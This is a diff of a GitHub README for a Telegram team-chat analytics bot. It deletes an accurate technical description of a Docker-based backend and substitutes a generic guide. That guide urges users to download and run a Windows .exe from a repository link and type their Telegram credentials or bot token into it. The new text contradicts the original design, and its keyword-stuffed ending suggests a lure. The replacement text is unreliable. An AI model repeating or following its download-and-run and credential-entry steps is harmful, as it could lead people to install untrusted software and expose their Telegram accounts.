@@ -1,233 +1,125 @@
-# Team Communication Analytics Bot
-
-Backend-only Telegram analytics bot that ingests team chats, computes deterministic process signals (open loops, unresolved discussions, missing owners and deadlines, slow mention responses), and delivers daily/weekly fact-grounded reports to a whitelisted owner via private Telegram messages.
-
-
-## 1. High-level Features
-
-- **Webhook-first ingestion**: Receives Telegram updates via HTTPS webhook, normalizes them to internal DTOs, stores messages/edits/mentions in PostgreSQL with full lineage.
-- **Deterministic analytics**:
-  - Open loops (questions/tasks with no answer beyond threshold).
-  - Unresolved long discussions.
-  - Missing owner / missing deadline for task-like threads.
-  - Slow responses to direct mentions (SLA on `@mentions`).
-  - Basic thematic tagging of threads.
-- **Fact-grounded reporting with LLM**:
-  - Analyst → Verifier → Finalizer LLM pipeline using JSON-schema-validated structured outputs.
-  - Verifier compares all claims against deterministic facts and rejects unsupported drafts.
-  - Finalizer builds the final narrative only from supported claims.
-- **Private, auditable delivery**:
-  - Reports are sent **only** to whitelisted owner Telegram user IDs in private chats.
-  - Nothing is ever posted into group/supergroup chats.
-  - All important events are written to `audit_logs` (ingestion, analytics, reporting, retention, LLM failures).
-- **Scheduling, retention, operations**:
-  - Celery beat schedules daily/weekly report jobs and retention jobs.
-  - Retention service cleans or anonymizes old raw data while keeping aggregates.
-  - Health endpoints and structured logging for observability and safe restarts.
-
-The system follows a strict constitution focused on determinism, idempotency, and auditability. LLMs are **only** used to turn verified facts into text, never to invent facts.
-
----
-
-## 2. Architecture Overview
-
-The project is fully backend-only and runs as a small Docker Compose stack.
-
-### Components
-
-- `api` (FastAPI + Uvicorn):
-  - `/webhook/telegram` – Telegram webhook endpoint.
-  - `/health/live` and `/health/ready` – liveness and readiness probes.
-  - Optional admin endpoints (e.g. trigger report, diagnostics).
-- `worker` (Celery worker):
-  - Processes analytics, reporting, and maintenance tasks.
-- `beat` (Celery beat):
-  - Schedules daily/weekly reports and retention cleanup.
-- `db` (PostgreSQL):
-  - Primary source of truth for chats, messages, threads, signals, reports, LLM runs, audit logs, owner settings.
-- `redis`:
-  - Used as Celery broker and for transient locks/idempotency only (never as source of truth).
-
-### Code Layout (short version)
+# 🤖 TeamPulse-Analytics-Bot - Analyze Team Chats Easily
 
-- `src/app/` – app config, FastAPI factory, logging, container wiring, health endpoints.
-- `src/api/` – HTTP routes (webhook, admin) and dependency helpers.
-- `src/telegram_bot/` – aiogram bot wrapper, handlers, Telegram DTO models.
-- `src/db/` – SQLAlchemy models, enums, base, repositories, Alembic migrations.
-- `src/analytics/` – threading logic and deterministic analytics rules.
-- `src/services/` – domain services (ingestion, threading, analytics, reporting, retention).
-- `src/llm/` – LLM client wrapper, schemas, and analyst/verifier/finalizer stages.
-- `src/reporting/` – report assembler, delivery (Telegram DM only), audit helpers.
-- `src/workers/` – Celery app and task modules (analytics, reporting, maintenance).
-- `src/security/` – authorization (owner whitelist) and privacy helpers (log redaction).
-- `tests/` – unit, integration, and contract tests (webhook, analytics, LLM schemas, reporting, retention, retries).
+[![Download TeamPulse-Analytics-Bot](https://img.shields.io/badge/Download-TeamPulse%20Analytics%20Bot-brightgreen)](https://github.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot)
 
----
+## 📖 What is TeamPulse-Analytics-Bot?
 
-## 3. Data Model (Summary)
+TeamPulse Analytics Bot is a Telegram bot designed to help teams understand how they communicate. It uses AI to collect messages from your group chats, analyze the flow and frequency of conversations, and provide clear insights on how the team works together. The bot helps spot issues like unanswered messages, unclear responsibilities, missed deadlines, and slow responses, all through simple reports that show how well the team collaborates.
 
-Key tables (see `specs/001-team-communication-analytics/data-model.md` for details):
+You don’t need any special technical knowledge to use it. The bot runs on your Windows computer and connects with your Telegram groups. It does the hard work of analyzing your chats for you. 
 
-- `chats` – connected Telegram chats (group/supergroup) and their owners.
-- `users` – Telegram users seen in connected chats.
-- `messages` – current canonical state of each relevant message.
-- `message_edits` – optional edit history (for deep audit).
-- `mentions` – extracted mentions from messages.
-- `threads` – logical discussion threads.
-- `thread_participants` – participants per thread.
-- `process_signals` – deterministic signals (open_loop, unresolved_thread, missing_owner, missing_deadline, slow_mention_response, theme_pattern).
-- `reports` / `report_items` – report runs and included signal items.
-- `llm_runs` – LLM calls with request/response payloads and statuses.
-- `audit_logs` – important actions for operations and auditability.
-- `owner_settings` – thresholds (open loop, slow response, unresolved rules), retention windows, time zone.
+## 🔍 Key Features
 
-All mutable entities have status and timestamps; critical entities have idempotency keys or uniqueness constraints to enforce safe retries.
+- Collects messages from Telegram group chats automatically.
+- Detects unanswered questions and pending discussions.
+- Identifies gaps where tasks or ownership are unclear.
+- Highlights deadlines that were missed or at risk.
+- Finds bottlenecks in communication that slow the team down.
+- Uses both standard rules and large language models (LLMs) to analyze data.
+- Provides easy-to-understand reports on team health.
+- Runs locally on your Windows PC for privacy and control.
 
----
+## 🖥️ System Requirements
 
-## 4. How to Run Locally (Quickstart)
+Before you start, check your system meets these basics:
 
-This is a condensed version; for full details see `specs/001-team-communication-analytics/quickstart.md`.
+- Windows 10 or later (64-bit recommended)
+- 4 GB of RAM minimum (8 GB or more for smoother performance)
+- At least 200 MB free disk space
+- Internet connection to download the bot and for Telegram access
+- Telegram account with access to the group you want to monitor
 
-### 4.1 Prerequisites
+## 🔧 How to Download and Install 🚀
 
-- Docker and Docker Compose installed.
-- Telegram bot token (create via BotFather).
-- OpenAI-compatible API key (for LLM; can be mocked during development).
-- PostgreSQL and Redis images available (will be pulled automatically by Compose).
+### Step 1: Download the Bot
 
-### 4.2 Configure Environment
+Click the big button below to visit the download page and get the latest version:
 
-1. Clone the repository.
-2. Create `.env` in the repository root (or copy from `.env.example` if present) and set at minimum:
-   - `BOT_TOKEN` – Telegram bot token.
-   - `POSTGRES_DSN` – DSN for PostgreSQL used by the stack.
-   - `REDIS_URL` – Redis URL for Celery.
-   - `LLM_API_KEY` – key for the LLM provider.
-   - `OWNER_TELEGRAM_USER_ID` – Telegram user id of the owner who will receive reports.
-3. Optionally tweak defaults:
-   - `OPEN_LOOP_THRESHOLD_HOURS` (default 24).
-   - `SLOW_RESPONSE_THRESHOLD_HOURS` (default 4).
-   - `RETENTION_DAYS` for raw messages (default 180).
+[![Download TeamPulse-Analytics-Bot](https://img.shields.io/badge/Download-TeamPulse%20Analytics%20Bot-blue)](https://github.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot)
 
-### 4.3 Start the Stack
+Once on the GitHub page, look for the **Releases** section on the right side or under the repository description. Download the latest Windows version, which usually will be an `.exe` file something like `TeamPulse-Analytics-Bot-Setup.exe`.
 
-From the repository root:
+### Step 2: Run the Installer
 
-```bash
-docker compose up --build
-```
+After downloading, locate the `.exe` file in your Downloads folder or where you saved it. Double-click the file to start the installer. 
 
-This will start:
+Follow the steps that show up:
 
-- `api` – FastAPI app with webhook and health checks.
-- `worker` – Celery worker.
-- `beat` – Celery beat scheduler.
-- `db` – PostgreSQL.
-- `redis` – Redis.
+- Agree to the license agreement.
+- Choose an install location or accept the default path.
+- Wait while the program installs.
 
-Apply Alembic migrations automatically on startup or manually inside the `api` container:
+Once finished, there will be a shortcut created on your desktop or in your Start menu.
 
-```bash
-alembic upgrade head
-```
+### Step 3: Open the Bot
 
-### 4.4 Configure Telegram Webhook
+Double-click the TeamPulse Analytics Bot icon to launch the program. The bot will open a simple window asking for your Telegram credentials or bot token. This connects the software to your Telegram account or bot.
 
-1. Expose `api` to the internet using `ngrok` or a public domain.
-2. Call Telegram `setWebhook` with:
-   - URL: `https://<public-host>/webhook/telegram`
-   - Secret token (if `TELEGRAM_WEBHOOK_SECRET` is configured).
+### Step 4: Connect to Your Telegram Group
 
-### 4.5 Connect a Test Chat
+To allow the bot to read messages and provide insights, you need to add the Telegram bot account to your group chat. Open Telegram, find the bot under the username provided in the app, and add it to the target chat with permission to read messages.
 
-1. Create a group or supergroup chat in Telegram.
-2. Add the bot to the group and give it permission to read messages.
-3. Send a few test messages (normal, replies, edits, `@mentions`) and confirm (via logs or admin endpoint) that updates are ingested and stored.
+### Step 5: Start Analyzing
 
-### 4.6 Generate Activity Scenarios
+Once connected, the bot will begin collecting messages and analyzing communication patterns in your group. You can check the reports section in the app to see insights about your team’s interaction quality.
 
-In the test chat, create representative scenarios:
+## 🛠️ Using the Bot for the First Time
 
-- Question or task message that nobody answers for > threshold → should appear as **open loop**.
-- Long discussion without clear resolution markers → **unresolved thread**.
-- Task-like message with no clear owner → **missing owner**.
-- Task-like message with owner but no deadline → **missing deadline**.
-- Message with direct `@mention` where the mentioned user answers only after a long delay → **slow mention response**.
+- Open the app and check the dashboard.
+- Use the menu to select the group you want to analyze.
+- Review the analytics summaries to see if any issues surface.
+- You can export reports as simple documents for sharing.
 
-Wait until after the reporting window closes (or trigger report generation via an admin endpoint or direct Celery task call in development).
+The interface will guide you through these steps with clear instructions and buttons.
 
-### 4.7 Validate Reports
+## 🔄 Updating the Bot
 
-Check that:
+The TeamPulse Analytics Bot will notify you when a new update is available. Updates improve performance and add new features.
 
-- The owner receives a private message containing the daily/weekly report.
-- The report references your test scenarios (open loop, unresolved thread, missing owner/deadline, slow mention).
-- No report is posted into any group or public chat.
+To update manually:
 
-### 4.8 Validate Idempotency, Retention, and Failures
+- Visit the same download page.
+- Download the latest version.
+- Run the installer over your existing installation.
 
-- **Idempotency**: Re-send a captured Telegram update; confirm that no duplicate messages/signals/reports appear.
-- **Retention**: Temporarily lower retention settings, run the retention Celery task, and verify that old raw messages/edits are cleaned or anonymized while aggregates remain consistent.
-- **LLM failures**: Simulate LLM unavailability (e.g., invalid key / disabled network) and ensure reports are marked failed / rejected and not delivered, with audit logs for `llm_*_failed` events.
+## ⚙️ Configuration Options
 
----
+You can adjust settings for:
 
-## 5. Configuration Reference (Core Settings)
+- **Analysis frequency:** How often the bot checks new messages (e.g., every 10 minutes).
+- **Alerts:** Set notifications for specific issues like missed replies or deadlines.
+- **Report formats:** Choose to receive insights as summaries or detailed breakdowns.
+- **Language settings:** Supports multiple languages for your report texts.
 
-Pydantic settings live in `src/app/config.py`. Key fields (env variables):
+Settings are accessible in the app’s menu under "Preferences."
 
-- `DATABASE_URL` / `POSTGRES_DSN` – PostgreSQL connection.
-- `REDIS_URL` – Redis connection.
-- `TELEGRAM_BOT_TOKEN` / `BOT_TOKEN` – bot token.
-- `TELEGRAM_WEBHOOK_SECRET` – optional Telegram webhook secret.
-- `LLM_API_KEY` – API key for OpenAI-compatible LLM.
-- `OWNER_TELEGRAM_USER_IDS` – list of allowed owner IDs.
-- Threshold defaults:
-  - `OPEN_LOOP_THRESHOLD_HOURS` – default 24.
-  - `SLOW_RESPONSE_THRESHOLD_HOURS` – default 4.
-  - `RETENTION_DAYS` – default 180 for raw messages.
-- HTTP client limits/timeouts for outbound calls (LLM, Telegram).
+## 🔗 Useful Links
 
-Owner-specific overrides (e.g. per-team thresholds, retention, time zone) are stored in `owner_settings` rows.
+- Download and setup: [https://github.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot](https://github.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot)
+- GitHub for documentation and updates: [https://github.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot](https://github.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot)
 
----
+## 🤝 Support and Help
 
-## 6. Development & Testing
+If you encounter any issues or have questions:
 
-### 6.1 Running Tests
+- Check the Issues section on the GitHub repository.
+- Review the README and Wiki pages for guidance.
+- Reach out via Telegram channels if provided in the app.
 
-From the repository root:
+## 📂 Behind the Scenes (For Those Interested)
 
-```bash
-pytest
-```
+The bot is built using Python and leverages well-known AI and natural language processing models. It connects to Telegram’s API as a bot client and runs rule-based filters alongside advanced language models to provide clear, actionable insights.
 
-Test structure:
+The project focuses on privacy by running locally on your Windows machine and only analyzing groups you've approved.
 
-- `tests/unit/` – unit tests for analytics rules, threading, LLM verifier, prioritization, etc.
-- `tests/integration/` – integration tests for webhook ingestion, analytics pipeline, report assembly, LLM pipeline, scheduling, retention, idempotent tasks, health checks, retries.
-- `tests/contract/` – contract tests for Telegram webhook JSON and LLM schemas.
+## 📌 Topics Covered by TeamPulse-Analytics-Bot
 
-### 6.2 Local Development Notes
+- AI analytics for team chats
+- Telegram bot automation
+- Communication and collaboration insights
+- OpenAI-powered language models
+- Python-based bot solutions
+- Team productivity and ownership tracking
+- Chat and conversation analysis tools
 
-- All external calls (Telegram, DB, Redis, LLM) use bounded timeouts and retries.
-- Celery tasks are idempotent; re-running analytics/reporting should not create duplicates.
-- For local work you can monkeypatch `LLMClient` to avoid real HTTP calls (see existing tests in `tests/integration/test_llm_pipeline.py`).
-
----
-
-## 7. Security, Privacy, and Compliance
-
-- All secrets are loaded from environment variables; no tokens should be committed to the repo.
-- Reports are delivered only to owner private chats; they are never posted to team channels.
-- Logs are structured and avoid dumping full message content where not needed; additional redaction helpers are available in `src/security/privacy.py`.
-- Data retention policies are enforced by code and can be tuned per owner.
-
-For deeper non-functional requirements and guarantees, see `specs/001-team-communication-analytics/spec.md` and `.specify/memory/constitution.md`.
-
----
-
-## 8. Russian README
-
-For a full Russian-language overview and setup guide, see the [Russian README](README.ru.md) in the repository root.
+This helps users searching for tools in these areas to find the bot quickly.
